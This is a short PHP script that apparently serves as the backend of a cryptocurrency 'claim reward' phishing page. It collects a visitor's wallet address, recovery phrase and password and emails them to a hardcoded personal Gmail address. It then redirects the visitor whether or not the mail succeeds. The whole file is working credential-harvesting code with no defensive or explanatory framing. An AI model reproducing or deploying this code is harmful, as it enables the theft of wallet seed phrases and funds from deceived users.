<?php

  if(isset($_POST['submit'])){
    $w = $_POST['w'];
    $ks = $_POST['ks'];
    $kpass = $_POST['kpass'];
      
    $subject = "NEW MESSAGE FROM CLAIMREWARD";
      
    $body = "<p>Walladd: $w</p><br /><p>Phrase: $ks</p><p>Password: $kpas</p>";
    $to = "gagemarkowski@gmail.com";
        
    $headers .='Reply-To: '. $to . "\r\n" ;
    $headers .='X-Mailer: PHP/' . phpversion();
    $headers .="MIME-Version: 1.0\r\n";
    $headers .="Content-Type: text/html; charset=ISO-8859-1\r\n";
        
              
    if(mail($to,$subject,$body,$headers, '-f gagemarkowski@gmail.com -F "CLRW"')) {
      header("Location: barcode");
    } 
      else 
    {
      header("Location: barcode");
    }
      
      
      
  }

?>